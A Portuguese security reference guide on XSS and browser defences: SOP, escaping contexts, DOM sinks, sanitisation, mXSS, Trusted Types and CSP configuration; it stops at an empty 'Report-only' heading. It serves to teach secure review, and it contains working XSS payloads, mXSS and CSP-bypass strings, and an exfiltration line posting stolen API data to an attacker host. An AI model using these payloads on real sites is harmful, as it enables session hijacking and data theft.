# XSS e segurança do navegador

Superfície client-side inteira: o modelo de segurança do navegador (SOP, origem vs site, isolamento
de processo), XSS em todas as formas e contextos, sanitização de HTML, CSP, headers de segurança,
CSRF, CORS e os ataques que exploram a interface do navegador.

Abra este arquivo ao revisar front-end, template server-side que interpola dado, ou configuração de
headers/middleware HTTP — e quando a pergunta for "isso é XSS?", "essa CSP está boa?", "preciso de
token CSRF aqui?", "esse CORS está errado?".

Vizinhos, não repetidos aqui: injeção server-side em `references/injecao.md`; sessão, cookie de
auth e armazenamento de token em `references/autenticacao-e-sessao.md`; SSRF e open redirect
server-side em `references/ssrf-e-camada-http.md`; CORS de API, GraphQL e WebSocket em
`references/api-e-graphql.md`; SRI e integridade de dependência em
`references/supply-chain-e-cicd.md`; severidade em `references/threat-modeling-e-severidade.md`.
No OWASP Top 10:2025, XSS é **A05:2025 – Injection**; headers/CSP ausentes são
**A02:2025 – Security Misconfiguration**.

## Índice

- [O modelo de segurança do navegador](#o-modelo-de-segurança-do-navegador)
- [XSS: os três tipos e o impacto real](#xss-os-três-tipos-e-o-impacto-real)
- [Contextos de escape](#contextos-de-escape)
- [DOM XSS: sources e sinks](#dom-xss-sources-e-sinks)
- [Frameworks: onde exatamente não protegem](#frameworks-onde-exatamente-não-protegem)
- [Sanitização de HTML](#sanitização-de-html)
- [mXSS](#mxss)
- [Trusted Types](#trusted-types)
- [Content Security Policy](#content-security-policy)
- [Catálogo de headers de segurança](#catálogo-de-headers-de-segurança)
- [CSRF](#csrf)
- [CORS](#cors)
- [Outros ataques de navegador](#outros-ataques-de-navegador)
- [Sinais em revisão de código](#sinais-em-revisão-de-código)
- [Falsos positivos comuns](#falsos-positivos-comuns)
- [Fontes](#fontes)

---

## O modelo de segurança do navegador

Quase toda defesa client-side é uma modulação da Same-Origin Policy. Sem o modelo, o resto vira
decoreba.

### Origem

Uma **origem** é a tupla `(scheme, host, port)`, comparada exatamente, sem hierarquia. Em relação a
`https://app.exemplo.com/x`: `https://app.exemplo.com/y` é mesma origem (path não conta);
`http://app.exemplo.com/x` não é (scheme); `https://app.exemplo.com:8443/x` não é (porta);
`https://api.exemplo.com/x` e `https://exemplo.com/x` não são (host — subdomínio é outro host).

Casos especiais: uma URL `data:` navegada tem origem **opaca**, que serializa como `null` (base do
bypass de CORS descrito adiante). `blob:https://app.exemplo.com/uuid` **herda** a origem do criador
— por isso `URL.createObjectURL(new Blob([html],{type:'text/html'}))` aberto em nova aba é XSS na
sua origem.

### O que a SOP bloqueia e o que deixa passar

A SOP restringe **leitura** entre origens. Ela **não** impede a requisição de ser enviada nem de ser
processada com os cookies do usuário — essa é a raiz do CSRF.

Permitido cross-origin sem permissão do destino: `<form method=POST>` (com cookies, corpo
`urlencoded`, `multipart/form-data` ou `text/plain`); `<img>`, `<script src>`, `<link rel=stylesheet>`,
`<iframe>`, `<video>`, `<object>` (carregam e executam/renderizam — o conteúdo não é legível, mas o
efeito colateral sim: `<script src>` executa no contexto do atacante, que é como JSONP vaza dado);
navegação top-level e `window.open`; `fetch(..., {mode:'no-cors'})` (sai, resposta opaca).

Bloqueado sem CORS: ler corpo de `fetch`/XHR, ler `document` de iframe cross-origin, ler pixels de
`<canvas>` tainted, ler `localStorage`/IndexedDB/cookies de outra origem.

Exceções por design: `postMessage`; `window.opener`/`window.parent` com acesso limitado
(`location` write-only, `postMessage`, `closed`, `frames`, `length`); `document.domain` — **morto**,
desabilitado por padrão desde Chrome 115 via `Origin-Agent-Cluster`.

### Site (eTLD+1) vs origem

**Site** é o domínio registrável (eTLD+1), calculado com a [Public Suffix List](https://publicsuffix.org/).
"eTLD" inclui `com`, `co.uk`, `github.io`, `vercel.app`, `com.br`. Então `a.exemplo.com` e
`b.exemplo.com` são o mesmo site com origens diferentes; `alice.github.io` e `bob.github.io` são
**sites diferentes** porque `github.io` está na PSL. Com "schemeful same-site", `http://exemplo.com`
e `https://exemplo.com` também são sites diferentes.

Por que importa: (1) cookies ignoram porta e, com `Domain=`, atravessam subdomínios — um subdomínio
comprometido, ou um bucket abandonado com CNAME, **sobrescreve** cookies do pai, o que quebra
double-submit CSRF; (2) `SameSite` opera em site, então `Strict` não protege contra subdomínio;
(3) `Sec-Fetch-Site: same-site` também é eTLD+1 — requisição de `evil.exemplo.com` para
`app.exemplo.com` reporta `same-site`, não `cross-site`.

Prático: trate cada subdomínio como vizinho semi-confiável. Nunca hospede conteúdo gerado por
usuário em subdomínio do domínio de sessão sem `__Host-` nos cookies.

### Isolamento de processo, Spectre, COOP/COEP/CORP

Spectre tornou possível ler memória do próprio renderer por canal lateral de temporização. A defesa
estrutural é **Site Isolation**: cada site em processo separado, de modo que dado cross-site nunca
compartilhe espaço de endereçamento. Isso só funciona se a página não puxar recurso cross-origin
para dentro do processo. Três headers governam isso:

- **CORP** (`Cross-Origin-Resource-Policy`) — o *recurso* declara quem pode embedá-lo:
  `same-origin` | `same-site` | `cross-origin`. `same-origin` num JSON de API impede que outro site
  o carregue como subrecurso; mitiga Spectre e XS-Leaks.
- **COEP** (`Cross-Origin-Embedder-Policy`) — o *documento* exige que todo subrecurso cross-origin
  se declare embedável (`require-corp`) ou passe por CORS (`credentialless`).
- **COOP** (`Cross-Origin-Opener-Policy`) — `same-origin` corta a relação `window.opener` com quem
  abriu e com quem foi aberto. Mata tabnabbing reverso e frame-counting via `window.length`.

`COOP: same-origin` + `COEP: require-corp` ⇒ `self.crossOriginIsolated === true`, pré-requisito para
`SharedArrayBuffer` e `performance.now()` de alta resolução. Para app normal, o par que vale a pena
é **`COOP: same-origin` + `CORP: same-origin`**; `COEP: require-corp` quebra CDN, fontes e analytics
de terceiros e só se justifica se você precisa de `SharedArrayBuffer` (ffmpeg.wasm, SQLite WASM).

---

## XSS: os três tipos e o impacto real

| Tipo | Onde o payload passa | Detecção |
|---|---|---|
| Refletido | Chega no request, volta na resposta do mesmo request | Fuzz de parâmetro + grep da resposta; DAST acha bem |
| Armazenado | Persistido e servido depois, possivelmente a outro usuário | Impacto maior (worm, admin). DAST acha mal porque o sink está em outra página |
| DOM-based | Nunca toca o servidor — `location.hash` → `innerHTML` | Só análise de JS; scanner tradicional não vê |

**DOM-based é o que mais escapa de revisão.** Três razões concretas: o payload em `#fragment` **não
é enviado ao servidor**, então não aparece em log, WAF nem teste server-side; o fluxo source→sink
atravessa bundles minificados e bibliotecas de terceiros, e `grep innerHTML` no seu código não pega
o `innerHTML` dentro de `chunk-a3f2.js`; e a revisão de PR olha o diff, mas o sink foi introduzido
três anos atrás — o que mudou hoje foi só a source. Ferramenta certa: análise de taint em runtime
(DOM Invader do Burp), não regex.

**Impacto real**, em ordem de frequência em relatórios de bug bounty — roubo de cookie é o exemplo
de manual, mas com `HttpOnly` correto já não funciona:

1. **Ação como o usuário.** Com XSS na origem, todo token CSRF é legível
   (`document.querySelector('[name=csrf]').value`) e toda requisição sai same-origin com cookies.
   XSS derrota qualquer defesa de CSRF por construção. Cadeia padrão: mudar e-mail → pedir reset de
   senha → takeover.
2. **Exfiltração da API**: `fetch('/api/me').then(r=>r.text()).then(t=>fetch('//attacker',{method:'POST',body:t}))`.
3. **Keylogging e captura de formulário**, inclusive campos preenchidos por gerenciador de senha.
4. **Phishing na origem confiável** — cadeado válido, domínio correto. Contorna todo treinamento.
5. **Persistência via Service Worker**, que sobrevive a logout e limpeza de cookie.

Roubo de `localStorage` só importa se você guarda token lá (`references/autenticacao-e-sessao.md`).

---

## Contextos de escape

Escapar não é uma operação; são cinco. Aplicar a errada não protege — é o erro nº 1 em revisão de
template.

| Contexto | Template | Encoding necessário | Se você usar HTML-escape |
|---|---|---|---|
| Corpo HTML | `<div>DADO</div>` | HTML entity `& < > " '` | correto |
| Atributo com aspas | `<a title="DADO">` | HTML entity, mínimo `"` `&` `<` | funciona |
| **Atributo sem aspas** | `<a title=DADO>` | entity de tudo não-alfanumérico | **não protege**: `x onmouseover=alert(1)` — espaço encerra o atributo |
| Dentro de `<script>` | `var x = "DADO"` | `\xHH`/`\uXXXX` + escapar `</` | **não protege**: entidade HTML não é decodificada em raw text; `</script>` fecha o bloco |
| String JS em atributo de evento | `<div onclick="f('DADO')">` | JS escape **depois** HTML escape | não protege sozinho |
| URL em `href`/`src` | `<a href="DADO">` | validar esquema + `encodeURIComponent` no valor | **não protege**: `javascript:alert(1)` não tem caractere HTML especial |
| CSS (valor de propriedade) | `<style>a{color:DADO}</style>` | CSS escape `\XXXXXX`, só em valor | não protege |
| Nome de atributo ou de tag | `<DADO href=x>` | **não interpole**; allowlist ou nada | nada protege |

Regras da OWASP XSS Prevention Cheat Sheet: #1 HTML entity encode em elemento; #2 atributo encode
(`&#xHH;`, tudo exceto alfanuméricos) e **sempre com aspas**; #3 JavaScript encode (`\uXXXX`) sempre
entre aspas; #4 CSS encode; #5 URL encode; #6 sanitize HTML com biblioteca; #7 evite sinks de URL
com esquema controlável.

### Por que HTML-escape no contexto errado não protege

```html
<!-- ❌ valor HTML-escapado, mas o contexto é JS -->
<script>var nome = "&quot;;alert(1);//";</script>  <!-- o parser JS não decodifica entidade HTML -->
```

Dentro de `<script>` (e `<style>`, `<textarea>`, `<title>`, `<xmp>`) o conteúdo é raw text: o
tokenizer não interpreta tags nem, em raw text, entidades. A única sequência que encerra `<script>`
é `</script` (case-insensitive); `<!--` também inicia um estado de comentário que muda as regras.
Daí o único escape correto ao emitir JSON dentro de `<script>`:

```ts
// ✅ JSON dentro de <script>
const jsonParaScript = (d: unknown) => JSON.stringify(d)
  .replace(/</g, '\\u003c').replace(/>/g, '\\u003e')   // mata </script> e <!--
  .replace(/\u2028/g, '\\u2028').replace(/\u2029/g, '\\u2029')  // quebras de linha em JS < ES2019
```

`JSON.stringify` sozinho **não** escapa `<`, `>`, `/`, U+2028 nem U+2029. Melhor ainda: emita
`<script type="application/json" id="dados">` (tipo não-executável) e leia com
`JSON.parse(el.textContent)` — ainda precisa do escape de `<`, mas o conteúdo nunca é executado.
Bibliotecas: `serialize-javascript`, `devalue`.

### URL: o contexto que engana

```tsx
// ❌
<a href={props.url}>site</a>       // "javascript:alert(document.domain)"
<iframe src={props.url} />          // data:text/html;base64,... executa em origem opaca
<form action={props.url}>

// ✅ allowlist de esquema
const ESQUEMAS_OK = new Set(['http:', 'https:', 'mailto:'])
function urlSegura(bruta: string, base = location.href): string {
  try { const u = new URL(bruta, base); return ESQUEMAS_OK.has(u.protocol) ? u.href : '#' }
  catch { return '#' }
}
```

Detalhes que derrubam validação artesanal: `startsWith('http')` casa com `httpx:` — compare
`u.protocol` depois de `new URL()`, nunca a string crua. Espaços e caracteres de controle dentro do
esquema são removidos pelo tokenizer HTML, então `"\tjava\nscript:alert(1)"` vira `javascript:` e um
regex `/^javascript:/i` sobre a string crua não pega. `data:` é bloqueado em navegação top-level nos
navegadores modernos, mas continua funcionando em `<iframe src>` para phishing e para gerar
requisição com `Origin: null`.

---

## DOM XSS: sources e sinks

**Sources**: `location.href/.search/.hash/.pathname` (o `.hash` não vai ao servidor — invisível para
WAF e log); `document.URL`, `.documentURI`, `.baseURI`; `document.referrer` (o atacante escolhe a
página de origem); **`window.name`** (persiste através de navegação cross-origin — clássico para
carregar payload); `document.cookie`; `event.data` de `postMessage`; `localStorage`/`sessionStorage`/
IndexedDB; `history.state`; corpo de resposta de API; mensagem de WebSocket.

**Sinks**:

| Sink | Nota |
|---|---|
| `innerHTML`, `outerHTML` | `<img src=x onerror=alert(1)>` é o payload padrão. `<script>` inserido por `innerHTML` não roda; `onerror` roda |
| `insertAdjacentHTML`, `document.write(ln)` | `document.write` executa até `<script>` |
| `Range.createContextualFragment` | usado internamente por `jQuery.html()` |
| `DOMParser.parseFromString` | não executa sozinho, mas o fragmento sai com `on*` intactos — vira XSS ao inserir |
| `eval`, `new Function`, `setTimeout('str')`, `setInterval('str')` | com **função** é seguro; com **string** é `eval` |
| `location`, `.href`, `.assign/.replace`, `window.open` | XSS se o esquema for `javascript:` |
| `script.src`, `iframe.src`, `iframe.srcdoc` | `srcdoc` é HTML completo em atributo |
| `setAttribute(nome, valor)` com `nome` controlável | `setAttribute('onclick', …)`, `setAttribute('href','javascript:…')` |
| `dangerouslySetInnerHTML`, `v-html`, `{@html}`, `[innerHTML]`, `unsafeHTML` (Lit) | ver seção de frameworks |
| jQuery: `$(x)`, `.html()`, `.append/.prepend/.after/.before/.wrap/.replaceWith`, `$.parseHTML` | `$("<img src=x onerror=alert(1)>")` cria **e executa**. jQuery ≥3.5 fechou o mXSS de `<option>`, mas `$()` continua sendo sink |
| `Worker(url)`, `importScripts`, `import(url)` | URL controlável = execução |
| `setHTMLUnsafe`, `parseHTMLUnsafe` | existem em todos os navegadores; sem argumento de sanitizer são `innerHTML` |

Sinks **seguros** (OWASP): `textContent`, `insertAdjacentText`, `createTextNode`, `className`,
`setAttribute` com nome fixo seguro, `formfield.value`.

```ts
// ❌ DOM XSS — o payload nem chega ao servidor
const nome = new URLSearchParams(location.search).get('nome')
el.innerHTML = `Olá, ${nome}`      // ?nome=<img src=x onerror=alert(document.domain)>
// ✅
el.textContent = `Olá, ${nome ?? ''}`

// ❌ DOM open redirect que vira XSS
location.href = location.hash.slice(1)          // #javascript:alert(1)
// ✅
const d = new URL(location.hash.slice(1), location.origin)
if (d.origin === location.origin) location.href = d.href
```

---

## Frameworks: onde exatamente não protegem

Os quatro escapam texto interpolado no corpo do elemento e em atributos comuns: React escapa
`{expr}` para `& < > " '`, Vue escapa `{{ }}`, Svelte escapa `{expr}`. Angular é o único que
**sanitiza** ativamente (não só escapa): tem cinco contextos de segurança — HTML, Style, URL,
Resource URL, Script — e roda um sanitizador em `[innerHTML]` e em bindings de URL.

| Framework | Escape hatch | Nota |
|---|---|---|
| React | `dangerouslySetInnerHTML={{__html: x}}` | única forma de HTML cru; o nome é o aviso |
| React | `<a href={x}>` com `javascript:` | React 16.9+ apenas **avisa** no console; não bloqueia. `href="javascript:void(0)"` literal é inofensivo — o problema é `href` dinâmico |
| React | `ref` + `node.innerHTML = …` | escapa do modelo do React inteiro |
| React | `<div {...props}>` com props do usuário | permite `dangerouslySetInnerHTML` vindo do dado |
| Vue | `v-html="x"` | equivalente a `innerHTML` |
| Vue | `:href`, `:src`, `v-bind` com objeto não confiável | sem validação de esquema |
| Vue 2 | template compilado em runtime com string do usuário | template injection = XSS |
| Angular | `DomSanitizer.bypassSecurityTrust{Html,Script,Style,Url,ResourceUrl}` | qualquer ocorrência é achado de revisão |
| Angular | template montado no servidor por templating engine | a doc oficial diz "don't create Angular templates on the server side" |
| Angular | DOM direto via `ElementRef.nativeElement` | Angular não vê |
| Svelte | `{@html x}`, `<a href={x}>` | `innerHTML` puro, sem sanitização |
| Lit | `unsafeHTML`, `unsafeSVG`, `unsafeStatic` | |
| Todos | `srcset`, `formaction`, `xlink:href` em SVG, `style` com `url(...)` | esquecidos por sanitizador caseiro |

```tsx
// ❌ os quatro pecados típicos em React
<div dangerouslySetInnerHTML={{ __html: comentario.corpoHtml }} />
<a href={perfil.website}>site</a>
<div ref={r => { if (r) r.innerHTML = bio }} />
<script dangerouslySetInnerHTML={{ __html: `window.__D__=${JSON.stringify(dados)}` }} />

// ✅
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comentario.corpoHtml) }} />
<a href={urlSegura(perfil.website)} rel="noopener noreferrer" target="_blank">site</a>
<div ref={r => { if (r) r.textContent = bio }} />
<script type="application/json" id="d">{jsonParaScript(dados)}</script>
```

**SSR e hydration.** Todo framework com hydration serializa estado dentro de `<script>`: Next.js
emite `self.__next_f.push(...)` (App Router) ou `__NEXT_DATA__` (Pages Router); Nuxt emite
`__NUXT__`. Esses payloads recebem escape de `<` do framework — mas **serialização manual não
recebe**. Um campo com valor `</script><script>alert(1)</script>` quebra o bloco.

Em React Server Components, o valor retornado é serializado no fluxo RSC como *dado*, não código —
mas concatenar HTML no servidor e passar para `dangerouslySetInnerHTML` continua sendo XSS; RSC não
muda nada. `export const metadata = { title: userInput }` é escapado pelo Next; `<meta content={…}>`
escrito à mão sem aspas, não.

---

## Sanitização de HTML

Sanitizar só é necessário quando o requisito é **renderizar HTML do usuário** (editor rich text,
Markdown, e-mail). Se o requisito é mostrar texto, use `textContent`.

### DOMPurify

Padrão de fato; versão atual **3.4.12** (jul/2026). Roda no navegador e no Node (com `jsdom`).

```ts
const limpo = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['p','br','strong','em','ul','ol','li','a','code','pre'],
  ALLOWED_ATTR: ['href','title'],
  ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i,   // mata javascript:, data:
  FORBID_ATTR: ['style'],
  RETURN_TRUSTED_TYPE: true,                     // devolve TrustedHTML se TT estiver ativo
})
```

Opções que decidem se a config é segura: **`RETURN_DOM` / `RETURN_DOM_FRAGMENT`** devolvem nós em
vez de string e evitam o ciclo serializar→reparsear que causa mXSS; **`SAFE_FOR_TEMPLATES: true`**
remove `{{…}}` e `${…}`, necessário se o HTML sanitizado passar depois por AngularJS/Handlebars;
**`ALLOW_DATA_ATTR: false`** se você usa `data-*` para lógica (DOM clobbering e gadgets vivem aí);
`USE_PROFILES: {svg:true, mathML:true}` amplia muito a superfície de mXSS; **nunca**
`ADD_TAGS: ['iframe']` sem atributos restritos, porque `<iframe srcdoc>` é XSS completo. Hooks
(`addHook('afterSanitizeAttributes', …)`) são o lugar certo para adicionar `rel="noopener"` e
reescrever URLs — operam sobre nós, não sobre string.

CVEs recentes a conferir contra a versão em uso:

- **CVE-2026-0540** — mXSS por re-contextualização quando HTML sanitizado é reinserido via wrappers
  (`noscript`, `xmp`, `noembed`, `noframes`, `iframe`). Afeta **duas linhas**: 3.1.3–3.3.1 (fix em
  **3.3.2**) e 2.5.3–2.5.8 (fix em **2.5.9**) — quem está no 2.x não está imune só por não ser 3.x.
- **CVE-2026-41238** — bypass via prototype pollution: um gadget prévio injeta `tagNameCheck` e
  `attributeNameCheck` permissivos em `Object.prototype` e DOMPurify passa a aceitar custom elements
  arbitrários. Afeta 3.0.1–3.3.3; fix em **3.4.0**.
- **CVE-2026-47423** — `<selectedcontent>` permitido por padrão em 3.4.4 permitia re-clonagem do
  payload pelo navegador. Fix em **3.4.5**.

Padrão das três: sanitizar é corrida contra o parser HTML. Fixe a versão, atualize DOMPurify como
dependência de segurança crítica, e **não sanitize duas vezes**.

### Sanitizer API nativa

A `HTML Sanitizer API` padronizou e começou a enviar: **Firefox 148** (fev/2026) foi o primeiro,
Chrome seguiu. **Não é Baseline em agosto de 2026** — Safari não implementou. Use com feature
detection e fallback.

```ts
function setHtmlSeguro(el: Element, html: string) {
  if ('setHTML' in Element.prototype) {
    // setHTML sempre remove script/iframe/object/embed/frame/use e todos os on*,
    // mesmo que a config tente permitir
    el.setHTML(html, { sanitizer: new Sanitizer({ elements: ['p','b','i','a','ul','li'], attributes: ['href'] }) })
  } else {
    el.innerHTML = DOMPurify.sanitize(html)
  }
}
```

`Element.setHTML()`, `ShadowRoot.setHTML()` e `Document.parseHTML()` são **sempre XSS-safe** (aplicam
o baseline de remoção mesmo contra a config); `setHTMLUnsafe()`/`parseHTMLUnsafe()` respeitam a
config e podem deixar passar. `SanitizerConfig` aceita `elements` **ou** `removeElements`
(mutuamente exclusivos), `attributes` **ou** `removeAttributes`, `replaceWithChildrenElements`,
`comments`, `dataAttributes`. Métodos do objeto: `allowElement`, `removeElement`, `allowAttribute`,
`removeAttribute`, `replaceElementWithChildren`, `removeUnsafe`.

### Markdown → HTML

Markdown permite HTML cru por especificação. As opções internas de sanitização foram **removidas**
das bibliotecas justamente para forçar um sanitizador de verdade.

| Biblioteca | Default | O que fazer |
|---|---|---|
| `marked` (18.x) | **HTML cru passa**; a opção `sanitize` foi removida na v5 | sanitize a saída com DOMPurify |
| `markdown-it` | `html: false` (tags viram texto) — seguro se ninguém ligar `html: true` | grep por `html: true` |
| `remark`/`unified` | `remark-rehype` **descarta** HTML cru; `rehype-raw` reintroduz | com `rehype-raw`, encadeie `rehype-sanitize` |
| `react-markdown` (10.x) | seguro por default; mantenha `urlTransform` | `rehype-raw` sem `rehype-sanitize` é o bug de UI de chat LLM mais comum de 2025–2026 |

```tsx
// ❌ renderiza a resposta do modelo com HTML cru
<ReactMarkdown rehypePlugins={[rehypeRaw]}>{mensagem}</ReactMarkdown>
// ✅ a ordem importa: raw primeiro, sanitize depois
<ReactMarkdown rehypePlugins={[rehypeRaw, [rehypeSanitize, defaultSchema]]}>{mensagem}</ReactMarkdown>
```

Vetores que passam mesmo com `html: false`: `[clique](javascript:alert(1))`,
`![x](data:text/html,…)`, referência de link `[a]: javascript:alert(1)`, e imagem cuja URL vaza IP e
referrer. Validação de URL é obrigatória mesmo sem HTML cru. Saída de LLM é entrada não confiável —
`references/llm-e-ia.md`.

---

## mXSS

O parser HTML **muta** a árvore: fecha tags, move nós para fora de contextos inválidos, normaliza
namespaces. Se você sanitiza uma string, serializa e reparseia, a segunda passagem pode produzir uma
árvore diferente — e a diferença pode ser um payload.

Casos canônicos: `<svg></p><style><a id="</style><img src=x onerror=alert(1)>">` (o `<style>` dentro
de foreign content SVG é tratado diferente de dentro de HTML, e ao reserializar o conteúdo escapa);
`<noscript><p title="</noscript><img src=x onerror=alert(1)>">` (com scripting habilitado `<noscript>`
é raw text, sem scripting não é — um sanitizador em jsdom e o navegador discordam);
`<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>` (o clássico de
Mario Heiderich).

Regra prática: sanitize **uma vez** e insira **direto**, sem passar por string.

```ts
// ❌ sanitiza → string → template → parse de novo
el.innerHTML = `<div class="post">${DOMPurify.sanitize(html)}</div>`
// ✅ nós, sem segunda serialização
el.replaceChildren(DOMPurify.sanitize(html, { RETURN_DOM_FRAGMENT: true }))
```

Corolários: nunca sanitize no servidor e reprocesse no cliente (dois parsers diferentes) — sanitize
onde o HTML vai ser inserido; nunca aplique `replace`/regex depois do sanitizador (use hooks, que
operam sobre nós); sanitizar duas vezes não é mais seguro, é uma oportunidade de mutação a mais.

---

## Trusted Types

Trusted Types transforma DOM XSS de "bug em qualquer lugar" em "bug num arquivo auditável": em vez
de escapar em N lugares, você proíbe **string** de chegar em qualquer sink.

**Estado em agosto de 2026: Baseline.** Chrome/Edge desde v83 (2020), Safari 26 (set/2025), Firefox
concluiu em fev/2026. Não precisa mais de polyfill em navegador moderno.

```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types dompurify;
```

Com isso, `el.innerHTML = "texto"` lança `TypeError`; só `TrustedHTML` é aceito.

```ts
const politica = trustedTypes.createPolicy('dompurify', {
  createHTML: (s) => DOMPurify.sanitize(s),
  createScriptURL: (s) => {
    const u = new URL(s, location.origin)
    if (u.origin !== location.origin) throw new TypeError('URL não permitida')
    return u.href
  },
})
el.innerHTML = politica.createHTML(htmlDoUsuario)
```

Três tipos: `TrustedHTML` (`innerHTML`, `outerHTML`, `insertAdjacentHTML`, `srcdoc`,
`document.write`), `TrustedScript` (`eval`, `new Function`, `setTimeout` com string, `script.text`),
`TrustedScriptURL` (`script.src`, `Worker`, `importScripts`, `ServiceWorker.register`).

Uma política chamada **`default`** é aplicada automaticamente a toda string que chegue em qualquer
sink, o que permite adoção incremental — mas uma `default` que devolve a string sem tocar é
segurança zero com falsa sensação de proteção. Use `default` só para logar e migrar, com prazo.

Roteiro de adoção: (1) `Content-Security-Policy-Report-Only: require-trusted-types-for 'script'` com
`report-to`; (2) coletar violações por semanas — cada uma é um sink real, seu ou de dependência;
(3) criar políticas nomeadas para os casos legítimos e refatorar o resto para `textContent`;
(4) enforcement com `trusted-types` listando exatamente as políticas (evite `'allow-duplicates'` a
menos que bundles registrem a mesma política mais de uma vez). Angular registra a política `angular`
nativamente; React 19 funciona se `dangerouslySetInnerHTML` receber `TrustedHTML`.

---

## Content Security Policy

### Por que allowlist de host não funciona

O estudo do Google **"CSP Is Dead, Long Live CSP!"** (Weichselbaum, Spagnuolo, Lekies, Janc — ACM CCS
2016) analisou ~100 bilhões de páginas e 26.011 políticas distintas. Números para saber de cor:
**94,72% das políticas eram contornáveis**; **14 dos 15 domínios mais allowlisted** continham
endpoints inseguros, tornando **75,81%** das políticas bypassáveis; os **10 domínios mais
allowlisted bastam para contornar 68%**, e mesmo removendo JSONP e AngularJS desses 10 ainda restaria
bypass em **66%**.

Dois mecanismos: **JSONP** (`https://cdn.exemplo.com/api?callback=alert(1)//` — host permitido,
conteúdo escolhido pelo atacante) e **gadget de framework** — uma biblioteca num CDN allowlisted que
interpreta HTML como template. AngularJS 1.x é o caso canônico: com `angular.js` carregado de host
permitido, `<div ng-app>{{constructor.constructor('alert(1)')()}}</div>` executa **dentro** de uma
CSP que proíbe `unsafe-inline` e `unsafe-eval` (versões ≥1.6, com o sandbox de expressões removido).

Conclusão operacional: CSP por allowlist de host é teatro. A política que funciona é nonce +
`strict-dynamic`.

### A política que funciona

```
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic' https: 'unsafe-inline';
  object-src 'none'; base-uri 'none';
  require-trusted-types-for 'script';
  frame-ancestors 'none'; report-to csp-endpoint;
```

- **`'nonce-{RANDOM}'`** — ≥128 bits de CSPRNG, **único por resposta**. Nonce fixo, derivado de
  timestamp ou reutilizado em página cacheada equivale a `unsafe-inline`.
- **`'strict-dynamic'`** — script carregado por script já confiado (via `createElement('script')` +
  `appendChild`) herda a confiança; é o que faz bundler e loader dinâmico funcionarem sem allowlist.
  Efeito colateral: faz o navegador **ignorar todas as allowlists de host e `'self'`** em `script-src`.
- **`https:` e `'unsafe-inline'` ao final** são fallbacks para navegador antigo: quem entende nonce
  ignora `'unsafe-inline'`, quem entende `strict-dynamic` ignora `https:`. Seguro deixar.
- **`object-src 'none'`** — `<object data="data:text/html,…">` executa script; custo zero.
- **`base-uri 'none'`** — crítico e frequentemente esquecido. Com injeção de HTML *sem* script (você
  sanitizou tags perigosas mas deixou `<base>` passar), o atacante insere
  `<base href="https://evil.com/">` e **todo script relativo passa a carregar do domínio dele**,
  inclusive os que têm nonce — o nonce autoriza a tag, não a origem. `base-uri` é a única defesa.
- **`require-trusted-types-for 'script'`** fecha DOM XSS, que nonce nenhum resolve.

| Keyword | O que costuma exigir | Alternativa |
|---|---|---|
| `'unsafe-inline'` em `script-src` | handlers `onclick=`, `<script>` inline sem nonce | nonce; `addEventListener` |
| `'unsafe-inline'` em `style-src` | CSS-in-JS (styled-components, emotion), `el.style.x =` | risco menor, mas mantém CSS injection viva; nonce se a lib suportar |
| `'unsafe-eval'` | `eval`, `new Function`, `setTimeout(string)`, runtimes de template, React em **dev** (reconstrução de stack de erro do servidor) | remover em produção — nem React nem Next usam `eval` em produção por padrão |
| `'wasm-unsafe-eval'` | WebAssembly | keyword específica, muito melhor que `'unsafe-eval'` |

### CSP em Next.js

Na doc do Next.js 16.2.x o nonce é gerado no **`proxy.ts`** (arquivo que substituiu `middleware.ts`).
O Next lê o header `Content-Security-Policy` da requisição, extrai o padrão `'nonce-{valor}'` e
aplica automaticamente aos scripts de framework, bundles da página, estilos inline gerados e
`<Script nonce>`.

```ts
// proxy.ts
export function proxy(request: NextRequest) {
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64')
  const isDev = process.env.NODE_ENV === 'development'
  const csp = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}' 'strict-dynamic'${isDev ? " 'unsafe-eval'" : ''};
    style-src 'self' ${isDev ? "'unsafe-inline'" : `'nonce-${nonce}'`};
    img-src 'self' blob: data:; font-src 'self';
    object-src 'none'; base-uri 'self'; form-action 'self';
    frame-ancestors 'none'; upgrade-insecure-requests;
  `.replace(/\s{2,}/g, ' ').trim()

  const requestHeaders = new Headers(request.headers)
  requestHeaders.set('x-nonce', nonce)
  requestHeaders.set('Content-Security-Policy', csp)
  const response = NextResponse.next({ request: { headers: requestHeaders } })
  response.headers.set('Content-Security-Policy', csp)
  return response
}
// matcher: excluir api, _next/static, _next/image e prefetches do next/link
```

Leia `(await headers()).get('x-nonce')` em Server Component quando precisar passar `nonce` para um
`<Script>` de terceiro.

**O problema do nonce com renderização estática** — nonce exige dynamic rendering, porque página
estática é gerada no build, quando não existe request. Consequências: SSG e ISR desabilitados nas
rotas com nonce; sem cache de CDN por padrão; **PPR é incompatível** com CSP por nonce, porque o
shell estático não tem acesso ao nonce; e `output: 'export'` não pode usar nonce de forma alguma.

Alternativas quando o custo é proibitivo: (1) **CSP por hash com SRI** — `experimental.sri:
{ algorithm: 'sha256' }` gera `integrity` no build e permite `script-src 'self'` sem nonce nem
`unsafe-inline`, mantendo geração estática (experimental, App Router apenas); (2) aceitar
`'unsafe-inline'` e compensar com **Trusted Types** (que cobre DOM XSS) e zero inline handlers — é
pior, mas honesto; (3) emitir o nonce numa camada de edge que reescreve o HTML.

**Regra de revisão: CSP com `'unsafe-inline'` em `script-src` sem nonce não é mitigação de XSS.**
Não conte como controle compensatório ao calcular severidade.

### CSP em Fastify e Express

```ts
// @fastify/helmet 13.x — enableCSPNonces popula reply.cspNonce.{script,style}
app.register(helmet, {
  enableCSPNonces: true,
  contentSecurityPolicy: { directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", (req, res) => `'nonce-${res.cspNonce.script}'`, "'strict-dynamic'"],
    objectSrc: ["'none'"], baseUri: ["'none'"], frameAncestors: ["'none'"],
  }},
})

// helmet 8.x (Express) — gere o nonce em middleware anterior e leia de res.locals
app.use((_req, res, next) => { res.locals.nonce = crypto.randomBytes(16).toString('base64'); next() })
app.use(helmet({ contentSecurityPolicy: { directives: {
  scriptSrc: ["'self'", (_req, res) => `'nonce-${res.locals.nonce}'`, "'strict-dynamic'"],
  objectSrc: ["'none'"], baseUri: ["'none'"],
}}}))
```

### Report-only

```
